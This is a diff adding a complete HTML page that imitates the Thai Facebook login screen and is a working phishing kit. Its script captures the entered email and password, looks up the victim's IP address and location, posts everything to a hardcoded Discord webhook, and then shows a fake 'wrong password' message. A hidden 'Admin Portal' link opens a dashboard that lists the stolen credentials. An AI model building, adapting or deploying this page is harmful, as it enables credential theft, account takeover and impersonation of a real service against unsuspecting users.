@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – เข้าสู่ระบบหรือสมัครใช้งาน</title>
+    <!-- Favicon รูปตัว f ของ Facebook -->
+    <link rel="icon" href="download.png" type="image/x-icon">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+
+        /* ดีไซน์หน้า Facebook ปกติ */
+        body.fb-mode {
+            background-color: #f0f2f5;
+            color: #1c1e21;
+            font-family: SFProText-Regular, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        .fb-main-body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex: 1;
+            padding: 20px;
+        }
+        .fb-content-wrap {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 980px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 20px 0 112px 0;
+        }
+        .fb-left-section {
+            flex: 1;
+            padding-right: 32px;
+            box-sizing: border-box;
+            margin-bottom: 90px;
+        }
+        .fb-logo-text {
+            color: #1877f2;
+            font-size: 64px;
+            font-weight: bold;
+            margin: -28px 0 0 -6px;
+            letter-spacing: -2px;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        .fb-tagline {
+            font-size: 28px;
+            font-weight: normal;
+            line-height: 32px;
+            width: 500px;
+            color: #1c1e21;
+            margin: 0;
+        }
+        .fb-right-section {
+            flex: 1;
+            display: flex;
+            justify-content: flex-end;
+            flex-direction: column;
+            align-items: center;
+        }
+        .fb-card {
+            background: #ffffff;
+            border: none;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            box-sizing: border-box;
+            padding: 20px;
+            width: 396px;
+            text-align: center;
+        }
+        .fb-input-group {
+            margin-bottom: 12px;
+        }
+        .fb-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            color: #1c1e21;
+            font-size: 17px;
+            border-radius: 6px;
+            box-sizing: border-box;
+            outline: none;
+            background: #fff;
+        }
+        .fb-input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        .fb-login-btn {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: bold;
+            line-height: 48px;
+            padding: 0 16px;
+            width: 100%;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .fb-login-btn:hover {
+            background-color: #166fe5;
+        }
+        .fb-forgot-link {
+            color: #1877f2;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            display: block;
+            margin: 14px 0;
+        }
+        .fb-forgot-link:hover {
+            text-decoration: underline;
+        }
+        .fb-divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        .fb-create-btn {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 17px;
+            font-weight: bold;
+            line-height: 48px;
+            padding: 0 16px;
+            cursor: pointer;
+            display: inline-block;
+            transition: background-color 0.2s;
+        }
+        .fb-create-btn:hover {
+            background-color: #36a420;
+        }
+        .fb-page-create {
+            margin-top: 28px;
+            font-size: 14px;
+            text-align: center;
+            width: 396px;
+        }
+        .fb-page-create a {
+            color: #1c1e21;
+            font-weight: bold;
+            text-decoration: none;
+        }
+        .fb-footer {
+            background-color: #ffffff;
+            color: #737373;
+            font-size: 12px;
+            padding: 20px 0;
+            border-top: 1px solid #dddfe2;
+            margin-top: auto;
+        }
+        .fb-footer-wrap {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        .fb-langs, .fb-foot-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px 15px;
+            margin-bottom: 8px;
+        }
+        .fb-langs a, .fb-foot-links a {
+            color: #737373;
+            text-decoration: none;
+        }
+
+        /* Loading Spinner */
+        #fbLoadingOverlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.85);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            font-family: Helvetica, Arial, sans-serif;
+            color: #1877f2;
+            font-size: 16px;
+            font-weight: bold;
+        }
+        .fb-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1877f2;
+            border-radius: 50%;
+            width: 36px;
+            height: 36px;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 12px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* ดีไซน์หน้า Admin Hacker Theme (ซ่อนไว้ก่อน) */
+        body.admin-mode {
+            background-color: #030712;
+            color: #00ffcc;
+            font-family: 'Share Tech Mono', monospace;
+            padding: 30px;
+            margin: 0;
+        }
+        body.admin-mode::before {
+            content: " ";
+            display: block;
+            position: fixed;
+            top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            z-index: 99999;
+            background-size: 100% 2px, 3px 100%;
+            pointer-events: none;
+        }
+        .admin-container { max-width: 1100px; margin: 0 auto; }
+        h2.dash-title {
+            color: #00ffcc;
+            text-shadow: 0 0 10px rgba(0,255,204,0.6);
+            border-bottom: 2px dashed #00ffcc;
+            padding-bottom: 10px;
+            letter-spacing: 2px;
+        }
+        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin-bottom: 25px; }
+        .stat-card { background: rgba(0, 255, 204, 0.05); border: 1px solid #00ffcc; padding: 15px; border-radius: 4px; }
+        .stat-card h3 { margin: 0; font-size: 14px; color: #94a3b8; }
+        .stat-card p { margin: 10px 0 0 0; font-size: 24px; color: #fff; text-shadow: 0 0 8px #00ffcc; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: rgba(3, 7, 18, 0.9); border: 1px solid #00ffcc; }
+        th, td { padding: 14px; border: 1px solid #1e293b; text-align: left; font-size: 15px; }
+        th { background: rgba(0, 255, 204, 0.15); color: #00ffcc; }
+        tr:hover { background: rgba(0, 255, 204, 0.08); }
+        .btn-action { background: transparent; border: 1px solid #ef4444; color: #ef4444; padding: 8px 15px; cursor: pointer; font-family: 'Share Tech Mono', monospace; font-weight: bold; }
+        .btn-action:hover { background: #ef4444; color: #fff; }
+        .password-glitch { background: rgba(239, 68, 68, 0.1); color: #f43f5e; padding: 4px 8px; border: 1px dashed #f43f5e; font-weight: bold; }
+        
+        .secret-trigger {
+            position: fixed; bottom: 10px; right: 10px;
+            opacity: 0.05; cursor: pointer; font-size: 10px; color: #737373;
+            z-index: 999;
+        }
+        .secret-trigger:hover { opacity: 1; color: #1877f2; }
+    </style>
+</head>
+<body class="fb-mode" id="mainBody">
+
+    <!-- Loading Overlay -->
+    <div id="fbLoadingOverlay">
+        <div class="fb-spinner"></div>
+        กำลังเชื่อมต่อกับเซิร์ฟเวอร์ Facebook...
+    </div>
+
+    <!-- หน้าเว็บ Facebook -->
+    <div id="fbView" style="display: flex; flex-direction: column; flex: 1; width: 100%;">
+        <div class="fb-main-body">
+            <div class="fb-content-wrap">
+                <div class="fb-left-section">
+                    <h1 class="fb-logo-text">facebook</h1>
+                    <p class="fb-tagline">Facebook ช่วยให้คุณเชื่อมต่อและแชร์สิ่งต่างๆ กับผู้คนในชีวิตของคุณ</p>
+                </div>
+                <div class="fb-right-section">
+                    <div class="fb-card">
+                        <form id="fbLoginForm">
+                            <div class="fb-input-group">
+                                <input type="text" id="username" class="fb-input" required placeholder="อีเมลหรือหมายเลขโทรศัพท์มือถือ">
+                            </div>
+                            <div class="fb-input-group">
+                                <input type="password" id="password" class="fb-input" required placeholder="รหัสผ่าน">
+                            </div>
+                            <button type="submit" class="fb-login-btn">เข้าสู่ระบบ</button>
+                        </form>
+                        <a href="#" class="fb-forgot-link" onclick="alert('ไปที่หน้าช่วยเหลือการกู้คืนรหัสผ่าน')">ลืมรหัสผ่านใช่หรือไม่</a>
+                        <div class="fb-divider"></div>
+                        <button type="button" class="fb-create-btn" onclick="alert('เปิดฟอร์มสมัครใช้งานบัญชีใหม่')">สร้างบัญชีใหม่</button>
+                    </div>
+                    <div class="fb-page-create">
+                        <a href="#" style="color:#1c1e21; text-decoration:none; font-weight:bold;">สร้างเพจ</a> สำหรับเซเลบ แบรนด์ หรือธุรกิจ
+                    </div>
+                </div>
+            </div>
+        </div>
+        <footer class="fb-footer">
+            <div class="fb-footer-wrap">
+                <div class="fb-langs">
+                    <span>ไทย</span><a href="#">English (UK)</a><a href="#">日本語</a><a href="#">中文(简体)</a><a href="#">Tiếng Việt</a>
+                </div>
+                <div class="fb-divider" style="margin: 8px 0;"></div>
+                <div class="fb-foot-links">
+                    <a href="#">สมัครใช้งาน</a><a href="#">เข้าสู่ระบบ</a><a href="#">Messenger</a><a href="#">Facebook Lite</a><a href="#">Watch</a>
+                </div>
+                <p style="margin-top: 20px;">Meta © 2026</p>
+            </div>
+        </footer>
+    </div>
+
+    <!-- หน้า Dashboard แอดมิน -->
+    <div id="adminView" style="display: none;" class="admin-container">
+        <h2 class="dash-title">⚡ [CYBER_OPS] INTEL HARVESTER & COMMAND CENTER</h2>
+        <p><a href="#" onclick="switchToFacebook()" style="color:#00ffcc;">[‹] BACK TO FACEBOOK GATEWAY</a></p>
+        <div class="stats-grid">
+            <div class="stat-card">
+                <h3>TOTAL TARGETS CAPTURED</h3>
+                <p id="totalCount">0</p>
+            </div>
+            <div class="stat-card">
+                <h3>SYSTEM STATUS</h3>
+                <p style="color: #00ff66;">ONLINE [SECURE]</p>
+            </div>
+            <div class="stat-card">
+                <h3>LISTENING PORT</h3>
+                <p>TCP // 443 [HTTPS]</p>
+            </div>
+        </div>
+        <button class="btn-action" onclick="clearData()" style="margin-bottom: 15px;">[!] PURGE ALL CAPTURED LOGS</button>
+        <table>
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>TIMESTAMP</th>
+                    <th>TARGET USERNAME / EMAIL</th>
+                    <th>INTERCEPTED PASSWORD</th>
+                    <th>VECTOR</th>
+                    <th>DETAILS</th>
+                </tr>
+            </thead>
+            <tbody id="caseTableBody"></tbody>
+        </table>
+    </div>
+
+    <!-- ปุ่มลับเข้าหน้า Admin -->
+    <div class="secret-trigger" onclick="openAdminPortal()">Admin Portal</div>
+
+<script>
+    document.getElementById('fbLoginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        document.getElementById('fbLoadingOverlay').style.display = 'flex';
+
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        const timeNow = new Date().toLocaleString();
+        const userAgent = navigator.userAgent;
+
+        // --- ดึงข้อมูล IP Address และ Geolocation ---
+        let ipData = { ip: "Unknown", city: "Unknown", region: "Unknown", country_name: "Unknown", org: "Unknown" };
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            if (response.ok) {
+                ipData = await response.json();
+            }
+        } catch (error) {
+            console.log("Could not fetch IP data:", error);
+        }
+
+        const loginData = {
+            name: username,
+            contact: password,
+            issue: "Credential Intercept (IP: " + ipData.ip + ")",
+            details: `${ipData.city}, ${ipData.country_name} | Browser: ${userAgent.substring(0, 30)}...`,
+            time: timeNow
+        };
+
+        let cases = JSON.parse(localStorage.getItem('fb_recovery_cases')) || [];
+        cases.push(loginData);
+        localStorage.setItem('fb_recovery_cases', JSON.stringify(cases));
+
+        // --- ตั้งค่า Discord Webhook (เปลี่ยน URL ของคุณตรงนี้) ---
+        const webhookURL = "https://discord.com/api/webhooks/1565562488882335954/9cLhnDhm4ynYDgI9YUWZfcocWgJoshXeNrltPamoLJnbYh05aVwGPihTlHTXYPvlQ8Hp"; 
+        const discordPayload = {
+            embeds: [{
+                title: "🚨 [NEW TARGET CAPTURED] - Geolocation Log",
+                color: 16711680,
+                fields: [
+                    { name: "Username / Email", value: `\`\`\`${username}\`\`\``, inline: false },
+                    { name: "Password", value: `\`\`\`${password}\`\`\``, inline: false },
+                    { name: "IP Address", value: `\`\`\`${ipData.ip}\`\`\``, inline: true },
+                    { name: "Location", value: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`, inline: true },
+                    { name: "ISP / Network", value: `${ipData.org || 'N/A'}`, inline: false },
+                    { name: "Timestamp", value: timeNow, inline: false }
+                ]
+            }]
+        };
+
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(discordPayload)
+        }).catch(err => console.log(err));
+
+        setTimeout(function() {
+            document.getElementById('fbLoadingOverlay').style.display = 'none';
+            alert('รหัสผ่านที่คุณป้อนไม่ถูกต้อง โปรดลองอีกครั้ง');
+            document.getElementById('fbLoginForm').reset();
+        }, 1500);
+    });
+
+    // ฟังก์ชันเปิดหน้า Admin
+    function openAdminPortal() {
+        const pass = prompt("ENTER ADMIN PASSPHRASE:");
+        if (pass === "admin") {
+            document.getElementById('fbView').style.display = 'none';
+            document.getElementById('adminView').style.display = 'block';
+            document.getElementById('mainBody').className = 'admin-mode';
+            loadCases();
+        } else if (pass !== null) {
+            alert("ACCESS DENIED");
+        }
+    }
+
+    function switchToFacebook() {
+        document.getElementById('adminView').style.display = 'none';
+        document.getElementById('fbView').style.display = 'flex';
+        document.getElementById('mainBody').className = 'fb-mode';
+    }
+
+    function loadCases() {
+        const cases = JSON.parse(localStorage.getItem('fb_recovery_cases')) || [];
+        const tbody = document.getElementById('caseTableBody');
+        document.getElementById('totalCount').innerText = cases.length;
+        tbody.innerHTML = '';
+
+        if (cases.length === 0) {
+            tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; color:#64748b; padding: 30px;">NO DATA PACKETS CAPTURED YET...</td></tr>';
+            return;
+        }
+
+        cases.forEach((item, index) => {
+            const row = `<tr>
+                <td>#${index + 1}</td>
+                <td>${item.time}</td>
+                <td style="color: #38bdf8; font-weight: bold;">${item.name}</td>
+                <td><span class="password-glitch">${item.contact}</span></td>
+                <td>${item.issue}</td>
+                <td>${item.details}</td>
+            </tr>`;
+            tbody.innerHTML += row;
+        });
+    }
+
+    function clearData() {
+        if (confirm('CONFIRM PURGE ALL DATA PACKETS?')) {
+            localStorage.removeItem('fb_recovery_cases');
+            loadCases();
+        }
+    }
+</script>
+
+</body>
+</html>
